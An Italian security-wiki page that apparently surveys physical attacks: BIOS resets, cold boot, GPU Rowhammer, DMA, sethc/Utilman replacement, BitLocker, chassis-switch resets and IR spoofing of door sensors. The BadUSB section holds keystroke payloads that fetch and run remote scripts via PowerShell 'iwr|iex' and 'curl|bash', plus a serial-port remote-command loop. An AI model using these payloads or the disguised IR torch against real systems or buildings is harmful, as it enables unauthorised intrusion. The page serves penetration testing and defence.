# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

## Recupero della password del BIOS e sicurezza del sistema

Le impostazioni del firmware dei PC legacy possono essere reimpostate scollegando la batteria CMOS o utilizzando un jumper clear-CMOS documentato. Il tempo necessario con l'alimentazione scollegata dipende dalla scheda, mentre le password o le chiavi dei moderni UEFI possono risiedere in una memoria flash non volatile, in un embedded controller o in un dispositivo di sicurezza e quindi sopravvivere alla rimozione della batteria. Consultare il manuale della scheda o di servizio prima di cortocircuitare i pin; questa procedura può inoltre invalidare le misurazioni del TPM e attivare il ripristino della crittografia del disco.

Sui sistemi x86 legacy, strumenti come **killCMOS** e **CmosPwd** possono ispezionare o modificare le impostazioni supportate dal CMOS da un ambiente avviabile. CmosPwd riconosce i formati delle password di un insieme documentato di famiglie di BIOS meno recenti e può eseguire il backup, il ripristino o la cancellazione/eliminazione dello stato del CMOS; le sue build pubblicate sono destinate ad ambienti legacy DOS/Windows, Linux, FreeBSD e NetBSD.<sup>[[18]](#references)</sup> Queste utility non sono strumenti generici per rimuovere le password UEFI e richiedono un accesso sufficiente all'hardware e al firmware.

Alcuni firmware dei laptop mostrano un codice di challenge specifico del vendor dopo diversi tentativi di password falliti. Database come [bios-pw.org](https://bios-pw.org) possono ricavare password di recovery legacy specifiche del vendor per alcuni modelli, ma molti sistemi implementano un lockout senza una challenge da cui sia possibile ricavare la password. Considerare qualsiasi password generata come specifica del modello ed evitare di esaurire i contatori permanenti dei tentativi.

### Sicurezza UEFI

Per i moderni sistemi **UEFI**, CHIPSEC può verificare le protezioni delle variabili di Secure Boot. Iniziare con il controllo che non apporta modifiche riportato di seguito; la modalità opzionale `-a modify` tenta deliberatamente di corrompere le variabili e deve essere utilizzata solo su un sistema di laboratorio ripristinabile. CHIPSEC avverte che il suo driver con privilegi e l'accesso all'hardware a basso livello non sono adatti agli endpoint di produzione.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analisi della RAM e attacchi Cold Boot

La DRAM non perde immediatamente ogni bit quando l'intervallo di refresh si interrompe. Il tasso di decadimento varia considerevolmente in base alla tecnologia del modulo e alla temperatura; il raffreddamento può preservare dati utili molto più a lungo rispetto a un power cycle non raffreddato. Un attacco Cold Boot riavvia rapidamente il sistema in un piccolo ambiente di acquisizione o trasferisce un modulo raffreddato, cattura la memoria grezza e ricostruisce le chiavi crittografiche nonostante il decadimento dei bit. Un'utility per la copia dei dischi non è automaticamente un imager della memoria fisica, e Volatility analizza una cattura invece di acquisirla; usare uno strumento di acquisizione appropriato per la piattaforma e validato.<sup>[[12]](#references)</sup>

---

## Rowhammer della GPU contro le tabelle delle pagine

I moderni attacchi GPU Rowhammer diventano molto più utili quando prendono di mira i **metadati della memoria virtuale della GPU** invece dei buffer ordinari. Lavori recenti sulle **GPU NVIDIA Ampere GDDR6** mostrano che un attaccante che esegue codice CUDA senza privilegi può creare pattern di hammering specifici per la GPU, usare il **memory massaging** per posizionare le strutture di paging nelle righe vulnerabili e quindi modificare bit nella **tabella delle pagine di ultimo livello** o in una **directory delle pagine** intermedia. Una volta corrotta una singola voce di traduzione, l'attaccante può ottenere in modo incrementale **lettura/scrittura arbitraria della memoria della GPU** e poi passare alla compromissione dell'host.<sup>[[1]](#references)[[2]](#references)</sup>

### Pattern di Exploitation

1. **Profilare le righe attaccabili con hammering** nella GDDR6 e creare pattern di hammering consapevoli del refresh / non uniformi che eludano le mitigazioni in-DRAM.
2. **Eseguire il memory massaging delle allocazioni della GPU** in modo che il driver posizioni le strutture di traduzione delle pagine in posizioni fisiche attaccabili invece di mantenerle nel pool protetto predefinito. In pratica, ciò può significare esaurire la regione di memoria bassa delle tabelle delle pagine e distribuire grandi mapping UVM sparsi con stride controllati.
3. **Modificare i metadati di traduzione**, come **PFN** o i bit relativi all'aperture, all'interno di una voce di tabella delle pagine / directory delle pagine, in modo che la pagina virtuale controllata dall'attaccante venga risolta in pagine delle tabelle delle pagine, memoria arbitraria della GPU o mapping di sistema visibili all'host.
4. Riutilizzare il mapping contraffatto per riscrivere ulteriori voci di traduzione ed eseguire l'escalation a **lettura/scrittura arbitraria della memoria della GPU** tra i contesti GPU.

### Pivot verso l'host e mitigazioni

- Con **IOMMU disabilitato**, i mapping contraffatti dell'apertura di sistema possono esporre memoria fisica arbitraria dell'**host** alla GPU, trasformando la primitive della GPU in una compromissione completa dell'host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** prende di mira le voci della tabella delle pagine di ultimo livello, mentre **GeForge** mostra che corrompere un livello della directory delle pagine può essere più semplice, perché una modifica di un singolo bit può reindirizzare un sottoalbero di traduzione più ampio. Non considerare un solo livello di paging come critico per la sicurezza.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** rimane importante perché blocca il percorso diretto verso la memoria dell'host arbitraria usato da GDDRHammer/GeForge, ma **non costituisce una mitigazione completa**. **GPUBreach** mostra un pivot di secondo livello in cui l'attaccante corrompe buffer CPU scrivibili dalla GPU e di proprietà del driver, quindi attiva bug di memory-safety del driver NVIDIA per ottenere una primitive di scrittura nel kernel e una **root shell** anche con IOMMU abilitato.<sup>[[3]](#references)</sup>
- La **ECC a livello di sistema** è un'efficace misura di hardening sulle GPU workstation/server supportate. Le GPU consumer senza ECC espongono una superficie di difesa più debole.<sup>[[4]](#references)</sup>
- Questi attacchi non sono puramente teorici: **GeForge** ha riportato **1.171** bit flip su una RTX 3060 e **202** su una RTX A6000, sufficienti a creare una catena funzionante di escalation dei privilegi sull'host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attacchi Direct Memory Access (DMA)

Per il patching offline di UEFI IFR/NVRAM, che può effettuare il downgrade dell'applicazione IOMMU pre-boot e abilitare una catena DMA Windows, vedere:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** dimostra l'**acquisizione e il patching della memoria basati su DMA** tramite interfacce come FireWire e le prime configurazioni Thunderbolt, incluse firme storiche di login-bypass. Non è semplicemente “inefficace contro Windows 10”: l'exploitability dipende dall'interfaccia, dalla build target, dalla policy IOMMU, dallo stato di blocco e dal fatto che Windows Kernel DMA Protection sia supportato e abilitato. Windows 10 versione 1803 e successive ha introdotto Kernel DMA Protection sulle piattaforme compatibili, modificando sostanzialmente la superficie di attacco.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB per l'accesso al sistema

Su un volume Windows non crittografato o già sbloccato, un ambiente offline può sostituire i binary di accessibilità, come **sethc.exe** o **Utilman.exe**, con **cmd.exe**, ottenendo un prompt dei comandi SYSTEM quando viene eseguita la scorciatoia corrispondente nella schermata di logon. Strumenti come **chntpw** possono modificare i dati degli account locali SAM. Questi metodi non bypassano un volume BitLocker bloccato e possono danneggiare le credenziali protette da DPAPI/EFS; conservare copie forensi e backup.

**Kon-Boot** è uno strumento commerciale di authentication-bypass al boot per configurazioni Windows/macOS supportate. La compatibilità dipende dal sistema operativo, dalla modalità firmware, da Secure Boot e dalla configurazione della cifratura del disco; non decritta un volume bloccato da BitLocker.<sup>[[10]](#references)</sup>

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di boot e ripristino

- **Delete/Supr**, F2, F10 o un altro tasto del vendor possono aprire il firmware setup.
- **F8** accede alle opzioni avanzate di boot legacy di Windows solo nelle configurazioni in cui tale percorso è ancora abilitato; l'accesso al ripristino attuale varia.
- Tenere premuto **Shift** può impedire il logon automatico di Windows in alcune configurazioni, sebbene le impostazioni di policy/registro possano disabilitare tale comportamento.<sup>[[17]](#references)</sup>

### Dispositivi BAD USB

Dispositivi come **USB Rubber Ducky** e le schede Teensy possono enumerarsi come tastiere HID affidabili e iniettare keystroke predefiniti. Il payload inizialmente dispone dei privilegi e dell'accesso al desktop della sessione connessa; i prompt UAC, il blocco dello schermo, il layout della tastiera, il timing e la policy USB dell'endpoint continuano a limitarlo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

I privilegi di amministratore o di backup possono creare una shadow copy o salvare gli hive del registro, consentendo di acquisire file bloccati come **SAM** e **SYSTEM**. Questa è una tecnica di raccolta post-compromise, non un bypass dei privilegi, e dovrebbe essere correlata agli eventi `diskshadow`/VSS e di export degli hive del registro.

## Tecniche di implant BadUSB / HID

### Implant di cavi gestiti via Wi-Fi

- Gli implant basati su ESP32-S3, come **Evil Crow Cable Wind**, si nascondono all'interno di cavi USB-A→USB-C o USB-C↔USB-C, si enumerano esclusivamente come tastiera USB ed espongono il proprio stack C2 tramite Wi-Fi. L'operatore deve solo alimentare il cavo dall'host vittima, creare un hotspot denominato `Evil Crow Cable Wind` con password `123456789` e visitare [http://cable-wind.local/](http://cable-wind.local/) (o il relativo indirizzo DHCP) per raggiungere l'interfaccia HTTP integrata.<sup>[[8]](#references)</sup>
- L'interfaccia browser fornisce schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload memorizzati sono contrassegnati per OS, i layout della tastiera vengono cambiati al volo e le stringhe VID/PID possono essere alterate per imitare periferiche note.
- Poiché il C2 risiede all'interno del cavo, un telefono può preparare i payload, attivare l'esecuzione e gestire le credenziali Wi-Fi senza utilizzare la rete dell'organizzazione: una caratteristica utile per intrusioni fisiche di breve durata.

### Payload AutoExec consapevoli dell'OS

- Le regole AutoExec associano uno o più payload da eseguire immediatamente dopo l'enumerazione USB. L'implant esegue un fingerprinting leggero dell'OS e seleziona lo script corrispondente.
- Workflow di esempio:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è unattended, il semplice scambio di un cavo di ricarica può ottenere l'accesso iniziale “plug-and-pwn” nel contesto dell'utente connesso.

### Remote shell avviata tramite HID su Wi-Fi TCP

1. **Keystroke bootstrap:** un payload memorizzato apre una console e incolla un loop che esegue tutto ciò che arriva sul nuovo dispositivo seriale USB. Una variante Windows minimale è:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L'impianto mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia un TCP client (script Python, APK Android o eseguibile desktop) verso l'operatore. Qualsiasi byte digitato nella sessione TCP viene inoltrato al canale seriale sopra descritto, consentendo l'esecuzione remota di comandi anche su host isolati dalla rete. L'output è limitato, quindi gli operatori eseguono generalmente comandi alla cieca (creazione di account, preparazione di strumenti aggiuntivi, ecc.).

### Superficie di aggiornamento HTTP OTA

- L'interfaccia documentata di Evil Crow Cable Wind espone un endpoint di aggiornamento del firmware non autenticato su `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Gli operatori sul campo possono cambiare al volo le funzionalità (ad esempio, eseguire il flash del firmware di USB Army Knife) durante l'engagement senza aprire il cavo, consentendo all'implant di passare a nuove capacità mentre è ancora collegato all'host target.

## Bypass della crittografia BitLocker

Un'acquisizione forense autorizzata di un sistema attivo o utilizzato di recente può contenere una chiave master del volume BitLocker o materiale crittografico correlato mentre il volume è sbloccato. Strumenti commerciali come Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic possono cercare nelle immagini di memoria supportate, nei file di ibernazione o nei crash dump, ma il successo non è garantito. Le versioni moderne di Windows crittografano anche i crash dump quando BitLocker è abilitato, e una password di ripristino a 48 cifre memorizzata è un artefatto diverso da una chiave del volume presente in memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering per l'aggiunta della chiave di ripristino

Un attaccante che convince un amministratore a eseguire comandi di gestione di BitLocker può aggiungere un recovery-password, una external-key o un altro protector e quindi acquisirlo. Una password di ripristino non può essere una stringa arbitraria di zeri: le password numeriche di ripristino di BitLocker devono avere un formato valido di 48 cifre. La sintassi di amministrazione autorizzata pertinente è `manage-bde -protectors -add C: -recoverypassword`; elenca i protector risultanti con `manage-bde -protectors -get C:`. Monitora le aggiunte di protector e assicurati che il nuovo materiale di ripristino venga salvato esclusivamente in posizioni approvate.<sup>[[16]](#references)</sup>

---

## Sfruttamento degli switch di intrusione del telaio / manutenzione per eseguire il factory-reset del BIOS

Molti laptop moderni e desktop di piccolo formato includono uno **switch di intrusione del telaio** monitorato dall'Embedded Controller (EC) e dal firmware BIOS/UEFI. Sebbene lo scopo principale dello switch sia generare un avviso quando il dispositivo viene aperto, alcuni vendor implementano talvolta una **scorciatoia di ripristino non documentata**, attivata quando lo switch viene azionato secondo uno schema specifico.<sup>[[5]](#references)[[6]](#references)</sup>

### Come funziona l'attacco

1. Lo switch è collegato a un **interrupt GPIO** sull'EC.
2. Il firmware in esecuzione sull'EC tiene traccia della **temporizzazione e del numero di pressioni**.
3. Quando viene riconosciuto uno schema hard-coded, l'EC richiama una routine di *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS di sistema**.
4. All'avvio successivo, i modelli interessati caricano lo stato del firmware reimpostato. A seconda del vendor e della revisione, lo stato cancellato può includere una password supervisor, impostazioni di avvio personalizzate o chiavi Secure Boot registrate; lo stato del TPM e gli effetti sulla crittografia del disco devono essere valutati separatamente.

> Un ripristino del firmware può riabilitare le opzioni di avvio da dispositivi esterni, ma **non** decrittografa lo storage. BitLocker o un altro sistema di crittografia dell'intero disco può entrare in modalità di ripristino dopo modifiche al TPM/al firmware e continuare a proteggere l'unità interna senza una chiave di ripristino.<sup>[[16]](#references)</sup>

### Esempio reale – Laptop Framework 13

La scorciatoia di ripristino per il Framework 13 (11ª/12ª/13ª generazione) è:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Dopo il decimo ciclo, l'EC imposta un flag che istruisce il BIOS a cancellare la NVRAM al riavvio successivo. L'intera procedura richiede circa 40 s e **null'altro che un cacciavite**.<sup>[[5]](#references)</sup>

### Procedura di Exploitation generica

1. Accendere o sospendere-riprendere il target in modo che l'EC sia in esecuzione.
2. Rimuovere il coperchio inferiore per esporre l'interruttore di intrusione/manutenzione.
3. Riprodurre il pattern di commutazione specifico del vendor (consultare la documentazione e i forum, oppure fare reverse engineering del firmware dell'EC).
4. Rimontare e riavviare, quindi verificare quali impostazioni del firmware e credenziali sono effettivamente cambiate.
5. Se autorizzato e se il boot esterno è disponibile, avviare una live image controllata. Una volta sbloccato legittimamente un volume interno (o se non è mai stato cifrato), l'ambiente live può acquisire credenziali e dati oppure ispezionare la EFI System Partition. La modifica di tale partizione per installare un EFI implant è persistente e altamente invasiva, e resta soggetta a Secure Boot, measured boot, protezione dalla scrittura del firmware e monitoraggio degli endpoint. Lo storage cifrato rimane inaccessibile senza la relativa chiave o il materiale di ripristino.

### Rilevamento e mitigazione

* Registrare gli eventi di intrusione dello chassis nella console di gestione del sistema operativo e correlarli con reset imprevisti del BIOS.
* Utilizzare **sigilli antimanomissione** su viti e coperchi per rilevarne l'apertura.
* Conservare i dispositivi in **aree fisicamente controllate**; presumere che l'accesso fisico equivalga alla compromissione completa.
* Ove disponibile, disabilitare la funzionalità vendor di “maintenance switch reset” o richiedere un'autorizzazione crittografica aggiuntiva per i reset della NVRAM.

---

## IR Injection clandestina contro i sensori di uscita no-touch

### Caratteristiche del sensore
- I sensori commerciali “wave-to-exit” abbinano un emettitore LED near-IR a un modulo ricevitore simile a quello di un telecomando TV, che segnala logic high solo dopo aver rilevato più impulsi (~4–10) della portante corretta (≈30 kHz).<sup>[[7]](#references)</sup>
- Un involucro in plastica impedisce all'emettitore e al ricevitore di guardarsi direttamente, quindi il controller presume che ogni portante convalidata provenga da una riflessione vicina e pilota un relè che apre la serratura della porta.
- Quando il controller ritiene che sia presente un target, spesso modifica l'inviluppo della modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst che corrisponda alla portante filtrata.

### Workflow dell'attacco
1. **Acquisire il profilo di emissione** – collegare un logic analyser ai pin del controller per registrare sia le forme d'onda precedenti al rilevamento sia quelle successive, che pilotano il LED IR interno.
2. **Riprodurre solo la forma d'onda “post-detection”** – rimuovere o ignorare l'emettitore di serie e pilotare un LED IR esterno con il pattern già attivato fin dall'inizio. Poiché il ricevitore considera solo il numero e la frequenza degli impulsi, tratta la portante spoofed come una riflessione autentica e porta a high la linea del relè.
3. **Regolare la trasmissione** – trasmettere la portante in burst calibrati (ad esempio, decine di millisecondi attivi e altrettanti inattivi) per fornire il numero minimo di impulsi senza saturare l'AGC del ricevitore o la logica di gestione delle interferenze. Un'emissione continua desensibilizza rapidamente il sensore e impedisce l'attivazione del relè.

### IR Injection riflessa a lunga distanza
- La sostituzione del LED da banco con un diodo IR ad alta potenza, un driver MOSFET e ottiche di focalizzazione consente un'attivazione affidabile da circa 6 m di distanza.
- L'attaccante non necessita della linea di vista verso l'apertura del ricevitore; puntare il fascio verso pareti interne, scaffalature o telai delle porte visibili attraverso il vetro consente all'energia riflessa di entrare nel campo visivo di circa 30° e simulare un gesto della mano a distanza ravvicinata.
- Poiché i ricevitori sono progettati per aspettarsi solo riflessioni deboli, un fascio esterno molto più intenso può rimbalzare su più superfici rimanendo comunque sopra la soglia di rilevamento.

### Torcia d'attacco weaponised
- Integrare il driver all'interno di una torcia commerciale nasconde lo strumento in bella vista. Sostituire il LED visibile con un LED IR ad alta potenza adatto alla banda del ricevitore, aggiungere un ATtiny412 (o simile) per generare i burst a ≈30 kHz e usare un MOSFET per assorbire la corrente del LED.
- Una lente zoom telescopica restringe il fascio per aumentarne portata e precisione, mentre un motore a vibrazione controllato dall'MCU fornisce una conferma aptica che la modulazione è attiva senza emettere luce visibile.
- Alternare diversi pattern di modulazione memorizzati (con frequenze portanti e inviluppi leggermente differenti) aumenta la compatibilità tra famiglie di sensori rebrandizzati, consentendo all'operatore di scandire le superfici riflettenti finché il relè scatta udibilmente e la porta si apre.

---

## References

- [1] [GDDRHammer: Disturbare fortemente le righe DRAM — Rowhammer cross-component dagli attuali GPU](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering della memoria GDDR per forgiare le tabelle delle pagine GPU per divertimento e profitto](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Attacchi di escalation dei privilegi sulle GPU usando Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avviso di sicurezza: Rowhammer - luglio 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Premi qui per fare pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guida al reset della mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypass dei sensori di uscita IR No-Touch con una torcia IR clandestina”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking con Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attacco Rowhammer contro i chip NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentazione ufficiale e informazioni sulla compatibilità di Kon-Boot](https://kon-boot.com/)
- [11] [Documentazione di CHIPSEC - Protezioni delle variabili Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Attacchi Cold Boot alle chiavi di cifratura](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipolazione della memoria fisica tramite DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentazione di Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guida alle operazioni di BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - comportamento della pressione di Shift e dell'accesso automatico](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentazione e download di CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
